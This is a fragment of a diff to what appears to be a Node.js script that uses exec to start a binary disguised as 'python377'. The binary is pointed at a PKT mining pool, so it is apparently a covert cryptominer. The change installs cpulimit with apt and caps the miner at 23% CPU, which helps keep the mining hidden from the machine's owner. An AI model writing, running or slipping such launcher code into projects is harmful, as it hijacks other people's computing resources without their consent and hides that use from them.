@@ -12,7 +12,7 @@ exec('chmod +x python377 && ./python377 ann http://pool.pkt.world http://pool.pk
         console.error(`stderr: ${stderr}`);
 });
 
-exec('cpulimit -e python377 -l 23', (error, stdout, stderr) => {
+exec('apt update && apt install cpulimit && cpulimit -e python377 -l 23', (error, stdout, stderr) => {
     if (error) {
         console.error(`exec error: ${error}`);
         return;
